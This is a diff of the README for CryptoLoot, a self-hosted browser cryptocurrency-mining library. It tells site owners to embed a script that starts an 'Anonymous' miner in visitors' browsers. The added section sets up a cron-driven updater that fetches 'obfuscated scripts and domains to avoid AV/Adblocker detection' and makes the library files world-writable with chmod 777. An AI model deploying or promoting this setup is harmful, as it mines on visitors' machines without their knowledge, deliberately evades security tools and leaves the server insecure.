@@ -1,7 +1,7 @@
 # cryptoloot
 
-Self Hosted Library for CryptoLoot
-==================================
+Self Hosted Library for CryptoLoot v2.0
+=======================================
 
 How to Install:
 1) Download https://github.com/Crypto-Loot/cryptoloot/archive/master.zip and uncompress at yoursite.com home directory
@@ -9,19 +9,37 @@ or alternatively use ```git clone https://github.com/Crypto-Loot/cryptoloot.git`
 2) Register at https://crypto-loot.com to get your public site ID, you'll need this for the next step.
 3) Add the script to your website, preferably ABOVE </body> tag, and not within the <head></head> tags. Make sure to edit YOUR_PUBLIC_KEY with your site ID from crypto-loot.com:
 ```text
-<script src="lib/crlt.js"></script>
+<script src="lib/crypta.js"></script>
 <script>
-	CRLT.CONFIG.LIB_URL = "https://yourwebsite.com/lib/";
             var miner=new CRLT.Anonymous('YOUR_PUBLIC_KEY', {
                 threads:4,autoThreads:false,throttle:0.2,
             });
         miner.start();
 </script>
 ```
-NOTE: Also, edit your website domain above and point that to your lib directory.
+NOTE: Also, edit your site key above from the one you have on https://crypto-loot.com
 
 4) All set. Now just send some traffic!
 
+5) Optional: Set to automatically update (to stay up to date with the latest obfuscated scripts and domains to avoid AV/Adblocker detection):
+Make sure to install php-curl extension on your server if it does not exist:
+
+***CentOS:***
+```text
+yum install php-curl
+```
+***Debian:***
+```text
+apt-get install php-curl
+```
+Change the permissions of these threee files to 777 so they can be overwritten on update:
+```text
+chmod 777 lib/crypta.js lib/polymath.js lib/version.txt
+```
+Install the cron to check for updates once every 12 hours:
+```text
+0 */12 * * * php /var/www/html/website/updater.php >> /var/www/html/website/cl_log.txt
+```
 
 Have any questions?
 ===================
